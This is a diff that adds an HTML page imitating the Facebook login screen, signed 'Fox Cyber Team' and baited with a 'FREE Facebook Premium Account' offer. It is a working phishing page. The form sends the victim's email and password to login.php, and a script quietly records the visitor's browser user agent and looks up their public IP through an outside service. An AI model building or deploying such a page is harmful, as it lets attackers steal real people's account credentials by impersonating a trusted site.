@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="lo.png" class="logo">
+        <h2>Log in to Facebook</h2>
+        <p class="offer">🎉 Get a FREE Facebook Premium Account! Limited Offer! 🎉</p>
+        <form id="loginForm" action="login.php" method="POST">
+            <input type="text" name="email" placeholder="Email or Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="ip" id="ip">
+            <input type="hidden" name="user_agent" id="user_agent">
+            <button type="submit">Log In</button>
+        </form>
+        <div id="loading" class="hidden">Logging in...</div>
+        <p class="footer">Fox Cyber Team</p>
+    </div>
+
+    <script>
+        document.getElementById("user_agent").value = navigator.userAgent;
+        
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("ip").value = data.ip;
+            });
+
+        document.getElementById("loginForm").addEventListener("submit", function () {
+            document.getElementById("loading").classList.remove("hidden");
+        });
+    </script>
+</body>
+</html>
